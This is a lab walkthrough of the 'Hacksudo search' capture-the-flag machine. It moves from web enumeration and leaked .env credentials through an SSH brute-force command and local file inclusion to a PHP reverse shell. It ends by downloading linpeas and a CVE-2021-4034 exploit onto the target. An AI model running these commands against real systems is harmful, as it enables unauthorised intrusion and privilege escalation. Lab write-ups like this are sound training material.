# Exercise 1: Hacksudo search

![](media/37fcbc807948f4fe46cbb097618b353d.png)

![Text Description automatically generated](media/b7e15df55ec9d6b3d9174c841525258d.png)

Nikto:  
![](media/9914df4574389b7b3f31a9b6a385c885.png)

.env might reveal some juicy info

![Graphical user interface, text, application Description automatically generated](media/c6cb438e8cfcb75ec43c4c9ade151b89.png)

MySQL credentials. However, port 3306 is not open, so there is no way to remotely access mysql database

SSH does not use the same credentials  
![Text Description automatically generated](media/a6d75e4f3915424c5d660c5bc43239db.png)

SSH brute force: hydra -l hiraman -P /home/kali/rockyou.txt ssh://192.168.50.18

APP_key decoded:  
![Graphical user interface, text, application, email Description automatically generated](media/052012bb8b6fe01dcb3c7ac3855476ff.png)

Enumerate further

dirbuster:  
![Graphical user interface, text, application Description automatically generated](media/9640850cb88719714bf3039dc6238334.png)

search.php and submit.php webpage only shows a button saying Submit Query, no field input. Leads to a google search![Graphical user interface, text, application Description automatically generated](media/f9690d86aa314eda360065b567d03133.png)

index.php:  
![Graphical user interface, application Description automatically generated](media/c608484637aded92e1e578ffdc11bcba.png)

entering anything leads to search.php website which leads to the google search

robots.txt:

![Graphical user interface, application, website Description automatically generated](media/a2e797bb11a8219b923a1e08b0e92ce2.png)

/accounts/ directory full of empty files, except for deleterecord.php:  
![Graphical user interface, text, website Description automatically generated](media/ee69073e8b592ef3e3dea86633ece316.png)

search1.php:  
![A screenshot of a computer Description automatically generated](media/d4f036e7824dd36d4968812dcf2c8e4f.png)

Similar site to search.php

![](media/dc6c44c9be99cc4d927431968788f096.png)

Possible attack vector: local file inclusion attack

Using ffuf:  
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u <http://192.168.50.18/search1.php?FUZZ=contact.php> -c -v  
![](media/be48bc7af6c7e9bc4328fca67ef15114.png)

Ignore 2918 size responses by adding -fs 2918 flag and speed up the task by adding -t 200 (uses 200 threads)

ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u <http://192.168.50.18/search1.php?FUZZ=contact.php> -c -v -fs 2918 -t 200

![](media/9d3a07194f76dde76ceb4bf1a4f0cd9b.png)

Try to read files with me?=\<filename\> keyword

![](media/86ada73b1cce7f51e3c8f66fe20ccc0a.png)

![A picture containing background pattern Description automatically generated](media/96a702a0377ad5e30e982f40636a62cc.png)Seems like we can read system files.

It also reads contents of webpage. Might be able to get reverse shell if we host a php reverse shell script

![](media/00887df0bc2006262604b172b61b6435.png)

Edit reverse shell file so it points to Kali IP

![Text Description automatically generated](media/d083c3d4bde1fdfef9e3fdeb7d4f4319.png)

![Text Description automatically generated](media/282305f18ee8a65e0e5a442411d94e98.png)

![Text Description automatically generated](media/604cc6d11cc46e3e3a01b7b8844018bd.png)

Find writable directories

![Text Description automatically generated](media/26489f3ef6a9d4b4657ba38d25547330.png)

Download linpeas, chmod so it’s executable and run it

![Text Description automatically generated](media/12770b7bfaffb252bdee6af2657e3001.png)

![](media/3ccea22307b611ba90ff91b6b55f76fd.png)

Download CVE-2021-4034 exploit onto kali: wget <https://codeload.github.com/berdav/CVE-2021-4034/zip/main> (saved as a zip file)

Host zip file on our web server, then wget 192.168.50.5/main.zip on target

unzip main.zip

go into new directory and run ‘make’

![Text Description automatically generated](media/70bab998b8cab3a391787e2d8143e65e.png)

![](media/1b2d28c93d04cf421dd83d3ab0bda237.png)
